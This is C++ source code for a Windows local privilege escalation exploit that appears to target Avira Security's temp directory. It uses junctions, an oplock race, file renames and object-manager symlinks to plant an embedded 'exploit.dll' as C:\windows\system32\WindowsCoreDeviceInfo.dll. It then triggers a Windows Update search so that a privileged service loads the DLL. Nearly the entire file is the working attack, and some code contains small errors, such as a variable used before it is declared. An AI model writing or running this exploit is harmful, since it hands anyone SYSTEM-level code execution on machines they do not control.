#include <windows.h>
#include <combaseapi.h>
#include <stdio.h>
#include <wuapi.h>
#include <combaseapi.h>
#include "FileOplock.h"
#include "def.h"
#include "dll.h"
#pragma warning(disable:4996)
HANDLE hFile = INVALID_HANDLE_VALUE;

std::wstring original_file;
std::wstring symlink_root = L"GLOBAL\\GLOBALROOT\\RPC Control\\";
std::wstring symlink,symlink2;
std::wstring dir;
std::wstring dll_file;


BOOL CreateJunction(LPCWSTR dir, LPCWSTR target);
BOOL DeleteJunction(LPCWSTR dir);
void load();
LPWSTR FindFile();
BOOL PrepareDir(LPCWSTR dir, LPCWSTR file);
void cb();
BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target);
BOOL WriteDll();
void TriggerDllLoad();


int wmain(int argc, wchar_t * *argv) {
    


    load();
    if (!CreateJunction(L"C:\\ProgramData\\Avira\\Security\\Temp", L"\\??\\c:\\expl")) {
        exit(1);
    }
    if (!CreateDirectory(L"C:\\expl", NULL)) {
        exit(1);
    }
    if (!WriteDll()) {
        exit(1);
    }
   
    SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
    SetThreadPriority(hThread, THREAD_PRIORITY_TIME_CRITICAL);
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)FindFile, NULL, 0, NULL);
    HANDLE dll = INVALID_HANDLE_VALUE;
    do {
       dll =  CreateFile(L"C:\\windows\\system32\\WindowsCoreDeviceInfo.dll", GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    } while (dll == INVALID_HANDLE_VALUE);

    printf("[+] File created! Deleting symlink's\n");
    DelDosDeviceSymLink(symlink.c_str(), dll_file.c_str());
    DelDosDeviceSymLink(symlink2.c_str(), L"\\??\\C:\\windows\\system32\\WindowsCoreDeviceInfo.dll");
    Sleep(1000);
    TriggerDllLoad();
}
BOOL CreateJunction(LPCWSTR dir, LPCWSTR target) {
    HANDLE hJunction;
    DWORD cb;
    wchar_t printname[] = L"";
    HANDLE hDir;
    hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);

    if (hDir == INVALID_HANDLE_VALUE) {
        printf("[!] Failed to obtain handle on directory %ls.\n", dir);
        return FALSE;
    }

    SIZE_T TargetLen = wcslen(target) * sizeof(WCHAR);
    SIZE_T PrintnameLen = wcslen(printname) * sizeof(WCHAR);
    SIZE_T PathLen = TargetLen + PrintnameLen + 12;
    SIZE_T Totalsize = PathLen + (DWORD)(FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer));
    PREPARSE_DATA_BUFFER Data = (PREPARSE_DATA_BUFFER)malloc(Totalsize);
    Data->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    Data->ReparseDataLength = PathLen;
    Data->Reserved = 0;
    Data->MountPointReparseBuffer.SubstituteNameOffset = 0;
    Data->MountPointReparseBuffer.SubstituteNameLength = TargetLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer, target, TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameOffset = (USHORT)(TargetLen + 2);
    Data->MountPointReparseBuffer.PrintNameLength = (USHORT)PrintnameLen;
    memcpy(Data->MountPointReparseBuffer.PathBuffer + wcslen(target) + 1, printname, PrintnameLen + 2);

    if (DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT, Data, Totalsize, NULL, 0, &cb, NULL) != 0)
    {
        printf("[+] Junction %ls -> %ls created!\n", dir, target);
        free(Data);
        return TRUE;

    }
    else
    {
        printf("[!] Error: %d. Exiting\n", GetLastError());
        free(Data);
        return FALSE;
    }
}
BOOL DeleteJunction(LPCWSTR dir) {
    REPARSE_GUID_DATA_BUFFER buffer = { 0 };
    BOOL ret;
    buffer.ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
    DWORD cb = 0;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING targetdir;
    IO_STATUS_BLOCK io;


    HANDLE hDir;
    hDir = CreateFile(dir, FILE_WRITE_ATTRIBUTES, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);


    ret = DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, &buffer, REPARSE_GUID_DATA_BUFFER_HEADER_SIZE, NULL, NULL, &cb, NULL);
    if (ret == 0) {
        printf("Error: %d\n", GetLastError());
    }
    else
    {
        printf("[+] Junction %ls delete!\n", dir);
    }
    return ret;
}

void cb() {
    printf("[+] Oplock triggered!\n");
    LPWSTR randomdir = NULL;
    UUID uuid = { 0 };
    NTSTATUS status = 1;

    if (!SUCCEEDED(CoCreateGuid(&uuid))) {
        printf("[!] Cannot create UUID!\n");
        exit(1);
    }
    if (!SUCCEEDED(StringFromCLSID(uuid, &randomdir))) {
        printf("[!] Cannot create UUID!\n");
        exit(1);
    }
    wchar_t a[256];
    _swprintf(a, L"\\??\\C:\\windows\\temp\\%s", randomdir);


    if (!DeleteFile(original_file.c_str())) {
        printf("Failed to delete file!\n");
        exit(1);
    }
    size_t buffer_sz = sizeof(FILE_RENAME_INFO) + (wcslen(a) * sizeof(wchar_t));

    FILE_RENAME_INFO* rename_info = (FILE_RENAME_INFO*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, buffer_sz);

    rename_info->ReplaceIfExists = TRUE;

    rename_info->RootDirectory = NULL;

    rename_info->Flags = 0x00000001 | 0x00000002 | 0x00000040;

    rename_info->FileNameLength = wcslen(a) * sizeof(wchar_t);

    memcpy(&rename_info->FileName[0], a, wcslen(a) * sizeof(wchar_t));

    IO_STATUS_BLOCK io = { 0 };


    status = pNtSetInformationFile(hFile, &io, rename_info, buffer_sz, 65);
    if (!NT_SUCCESS(status)) {
        
        exit(1);
    }
    CreateJunction(dir.c_str() , L"\\RPC Control");
    DosDeviceSymLink(symlink.c_str(), dll_file.c_str());
    DosDeviceSymLink(symlink2.c_str(), L"\\??\\C:\\windows\\system32\\WindowsCoreDeviceInfo.dll");
    
}
BOOL PrepareDir(LPCWSTR dir, LPCWSTR file) {



    hFile = CreateFile(file, GENERIC_ALL, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_FLAG_OVERLAPPED, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Failed to create file");
        exit(0);
    }
    FileOpLock* btlock;
    btlock = FileOpLock::CreateLock(hFile, cb);

    if (btlock != nullptr) {
        printf("[+] Oplock ok!\n");
        btlock->WaitForLock(INFINITE);
        delete btlock;

    }
    return TRUE;
}
LPWSTR FindFile() {

    HANDLE hDir = CreateFile(L"C:\\expl", GENERIC_READ, FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    std::wstring root = L"C:\\expl\\";
    std::wstring file;
    std::wstring tmp, tmp2;
    std::size_t pos;
    FILE_NOTIFY_INFORMATION fni[1024];

    BOOL run = FALSE;
    ULONG ret = 0;
    ULONG count = 0;

    do {
        run = ReadDirectoryChangesW(hDir, &fni, sizeof(fni), TRUE, 0x00000001 | 0x00000002, &ret, NULL, NULL);


        if (fni[0].Action == FILE_ACTION_ADDED) {

            if (count == 0) {

                dir = root + fni[0].FileName;

            }
            else
            {
                tmp = std::wstring(fni[0].FileName);
                pos = tmp.find(L"\\");
                tmp2 = tmp.substr(pos + 1);
                symlink =  symlink_root + tmp2.c_str();
                original_file = dir + L"\\" + tmp2.c_str();
                pos = tmp2.find(L"_");
                symlink2 = symlink_root + tmp2.substr(pos + 1);
                file = dir + L"\\" + tmp2.substr(pos + 1);
                PrepareDir(dir.c_str(), file.c_str());
                break;


            }
            count = count + 1;
        }

    } while (count != 2);


    
}
BOOL DosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH, object, target)) {
        printf("[+] Symlink %ls -> %ls created!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;

    }
}


BOOL DelDosDeviceSymLink(LPCWSTR object, LPCWSTR target) {
    if (DefineDosDevice(DDD_NO_BROADCAST_SYSTEM | DDD_RAW_TARGET_PATH | DDD_REMOVE_DEFINITION | DDD_EXACT_MATCH_ON_REMOVE, object, target)) {
        printf("[+] Symlink %ls -> %ls deleted!\n", object, target);
        return TRUE;

    }
    else
    {
        printf("error :%d\n", GetLastError());
        return FALSE;


    }
}
BOOL WriteDll() {
    wchar_t tmp[256];
    DWORD written;
    GetCurrentDirectory(256, (LPWSTR)&tmp);

    dll_file = L"\\??\\" + std::wstring(tmp);
    dll_file = dll_file + L"\\exploit.dll";
    HANDLE hFile = CreateFile(dll_file.c_str(), GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot create dll!\n");
        return FALSE;
    }
    if (!WriteFile(hFile, dll_bytes, sizeof(dll_bytes), &written, NULL)) {
        printf("[!] Cannot write to file!\n");
        return FALSE;
    }
    CloseHandle(hFile);
    printf("[+] DLL written: %ls\n", dll_file.c_str());
    return TRUE;
}
void load() {
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    if (ntdll != NULL) {
        pRtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(ntdll, "RtlInitUnicodeString");
        pNtCreateFile = (_NtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
        pNtSetInformationFile = (_NtSetInformationFile)GetProcAddress(ntdll, "NtSetInformationFile");

    }
    if (pRtlInitUnicodeString == NULL || pNtCreateFile == NULL) {
        printf("Cannot load api's %d\n", GetLastError());
        exit(0);
    }

}
VOID TriggerDllLoad() {
    IUpdateSearcher* search = NULL;
    IUpdateSession* session = NULL;
    ISearchResult* result = NULL;
    HRESULT hr;
    BSTR string = SysAllocString(L"IsInstalled=1");
    hr = CoInitialize(NULL);
    hr = CoCreateInstance(CLSID_UpdateSession, NULL, CLSCTX_INPROC_SERVER, __uuidof(IUpdateSession), (LPVOID*)&session);
    if (SUCCEEDED(hr)) {
        hr = session->CreateUpdateSearcher(&search);
        if (SUCCEEDED(hr)) {
            hr = search->Search(string, &result);
            if (SUCCEEDED(hr)) {
                printf("[!] Success!\n");
                goto cleanup;

            }
            else
            {
                printf("[!] Error: %8.8x\n", hr);
                goto cleanup;
            }
        }
        else
        {
            printf("[!] Error: %8.8x\n", hr);
            goto cleanup;
        }
    }
    else
    {
        printf("[!] Error: %8.8x\n", hr);
        goto cleanup;
    }
cleanup:
    if (session) {

        session->Release();
    }
    if (search) {
        search->Release();
    }
    if (result) {
        result->Release();
    }
    CoUninitialize();
}
